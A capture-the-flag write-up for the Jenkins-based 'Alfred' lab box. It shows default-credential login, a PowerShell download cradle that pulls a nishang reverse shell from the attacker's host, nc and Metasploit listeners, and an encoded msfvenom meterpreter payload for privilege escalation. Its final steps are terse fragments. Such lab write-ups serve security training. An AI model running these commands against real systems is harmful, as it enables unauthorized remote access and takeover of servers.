# Alfred

### Initial
```
mkdir Alfred
cd Alfred
mkdir scans
export IP=10.10.226.95
export LHOST=10.6.73.147
nmap -sC -sV -Pn $IP -oN scans/normal
gobuster dir -u http://$IP:8080 -w /opt/tools/directory-list-2.3-medium.txt | tee scans/gobuster.log
```

### Alfred admin login
**http://10.10.226.95:8080** <br>
Crecentials
> **admin:admin** # Just guessed, terrible password


In "http://10.10.226.95:8080/job/project/configure" at the bottom of the page there is a space where we have command execution, we can veryfy thhis by going to "http://10.10.226.95:8080/job/project/11/console" to verify the output of our commands
<screenshot1>
<screenshot2>

There we insert this command
On web:
```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.6.73.147:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.6.73.147 -Port 4444
```


Get the exploit<br>
`wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1`

Serve it in a local web server<br>
`python3 -m http.server 8080`

Also create a listener for the port we the reverse shell is goint to call bakck<br>
`nc -lnvp 4444`

Go to the website and click the **"Build Now"** button and receive the reverse shield



On the powershell console, use the Get-ChildItem cmdlet with the -Recurse switch to find the flag<br>
```
Get-ChildItem -Filter *.txt -Recurse
cat c:\users\bruce\Desktop\user.txt
```
**79007a09481963edf2e1321abd9ae2a0**<br>

Lets escalate priviledges, first, create the meterpreter reverse shell payload<br>
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.73.147 LPORT=5555 -f exe -o meterpreter.exe
```

Serve it in a local web server<br>
`python3 -m http.server 8081`

Get it from the current Powershell session<br>
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.73.147:8081/meterpreter.exe','meterpreter.exe')"
```


Set up the listener withing metasploit<br>
```
use multi/handler
set PAYLOAD /windows/meterpreter/reverse_tcp
set LHOST 10.6.73.147
set LPORT 5555
run 
```

Execute the payload
```
Start-Process meterpreter.exe
```
get elevated

get persistence
9999
SetDebugPrivilege


type C:\Windows\System32\config\root.txt

